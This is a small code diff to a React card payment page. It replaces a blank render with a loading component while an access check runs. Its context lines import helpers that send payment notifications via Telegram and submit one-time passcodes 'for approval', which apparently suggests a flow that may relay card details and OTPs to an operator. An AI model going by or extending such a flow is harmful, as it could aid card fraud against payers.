@@ -5,6 +5,7 @@ import { sendTelegramNotification } from "@/lib/payment-telegram";
 import { submitOtpForApproval } from "@/lib/otpApproval";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
+import FlowLoading from "@/components/FlowLoading";
 import { clearOtpResume, readOtpResume, saveOtpResume } from "@/lib/otpResume";
 import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";
 
@@ -306,7 +307,7 @@ const CardPaymentPage = () => {
 
 
 
-  if (isAllowed !== true) return null;
+  if (isAllowed !== true) return <FlowLoading />;
 
   if (showOtp) {
     const cancelHref = `/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`;
